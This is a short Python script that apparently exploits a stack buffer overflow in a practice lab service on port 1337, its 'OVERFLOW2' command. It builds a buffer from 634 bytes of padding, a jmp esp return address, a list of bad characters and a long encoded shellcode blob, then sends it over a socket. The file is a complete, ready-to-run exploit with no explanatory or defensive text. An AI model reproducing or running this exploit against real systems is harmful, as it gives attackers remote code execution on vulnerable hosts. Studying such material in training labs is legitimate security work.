#! /usr/bin/python3

import socket

IP = '192.168.56.1'
PORT = 1337

prefix = b'OVERFLOW2 '
offset = 634
overflow = b'A' * offset
retn = b'\xaf\x11\x50\x62'  #jmp esp 0x625011af
padding = b''

#badchars \x00\x23\x3c\x83\xba

shellcode =  b'\xfc\xbb\xe1\x36\xc3\x80\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x1d\xde\x41\x80\xdd\x1f\x26\x08\x38\x2e\x66\x6e\x49\x01\x56\xe4\x1f\xae\x1d\xa8\x8b\x25\x53\x65\xbc\x8e\xde\x53\xf3\x0f\x72\xa7\x92\x93\x89\xf4\x74\xad\x41\x09\x75\xea\xbc\xe0\x27\xa3\xcb\x57\xd7\xc0\x86\x6b\x5c\x9a\x07\xec\x81\x6b\x29\xdd\x14\xe7\x70\xfd\x97\x24\x09\xb4\x8f\x29\x34\x0e\x24\x99\xc2\x91\xec\xd3\x2b\x3d\xd1\xdb\xd9\x3f\x16\xdb\x01\x4a\x6e\x1f\xbf\x4d\xb5\x5d\x1b\xdb\x2d\xc5\xe8\x7b\x89\xf7\x3d\x1d\x5a\xfb\x8a\x69\x04\x18\x0c\xbd\x3f\x24\x85\x40\xef\xac\xdd\x66\x2b\xf4\x86\x07\x6a\x50\x68\x37\x6c\x3b\xd5\x9d\xe7\xd6\x02\xac\xaa\xbe\xe7\x9d\x54\x3f\x60\x95\x27\x0d\x2f\x0d\xaf\x3d\xb8\x8b\x28\x41\x93\x6c\xa6\xbc\x1c\x8d\xef\x7a\x48\xdd\x87\xab\xf1\xb6\x57\x53\x24\x18\x07\xfb\x97\xd9\xf7\xbb\x47\xb2\x1d\x34\xb7\xa2\x1e\x9e\xd0\x49\xe5\x49\x1f\x25\xdd\xe3\xf7\x34\x1d\xf5\xbc\xb0\xfb\x9f\xd2\x94\x54\x08\x4a\xbd\x2e\xa9\x93\x6b\x4b\xe9\x18\x98\xac\xa4\xe8\xd5\xbe\x51\x19\xa0\x9c\xf4\x26\x1e\x88\x9b\xb5\xc5\x48\xd5\xa5\x51\x1f\xb2\x18\xa8\xf5\x2e\x02\x02\xeb\xb2\xd2\x6d\xaf\x68\x27\x73\x2e\xfc\x13\x57\x20\x38\x9b\xd3\x14\x94\xca\x8d\xc2\x52\xa5\x7f\xbc\x0c\x1a\xd6\x28\xc8\x50\xe9\x2e\xd5\xbc\x9f\xce\x64\x69\xe6\xf1\x49\xfd\xee\x8a\xb7\x9d\x11\x41\x7c\xad\x5b\xcb\xd5\x26\x02\x9e\x67\x2b\xb5\x75\xab\x52\x36\x7f\x54\xa1\x26\x0a\x51\xed\xe0\xe7\x2b\x7e\x85\x07\x9f\x7f\x8c\x07\x1f\x80\x2f'

payload = prefix + overflow + retn + padding + shellcode
try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(3)
        s.connect((IP, PORT))
        print('Sending evil buffer...')
        s.send(payload)
        print('Done!')
except:
    print('Could not connect to remote host')